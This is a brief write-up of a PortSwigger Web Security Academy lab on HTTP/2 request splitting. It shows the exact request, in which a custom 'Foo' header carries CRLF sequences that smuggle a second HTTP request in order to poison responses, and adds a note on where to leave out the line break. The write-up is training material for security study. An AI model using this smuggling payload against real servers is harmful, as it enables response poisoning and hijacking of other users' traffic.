# [HTTP/2 request splitting via CRLF injection] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-26
 
---
 
## Vulnerability / core concept
HTTP Request Smuggling

---


## Payload / key command
In this lab we need to inject a complete HTTP request into header value using `\r\n` in Inspector in Repeater:
```bash
POST / HTTP/2
Host: 0ab600ed04c0b058801a0de600ab0075.web-security-academy.net
Foo: x\r\n
GET /404 HTTP/1.1\r\n
Host: 0ab600ed04c0b058801a0de600ab0075.web-security-academy.net
```
We need to create a malicious custom `Foo` header that will contain a complete request and exploit response poisoning. 

Note: It is important to NOT use `\r\n` after `Host` header inside `Foo`. 

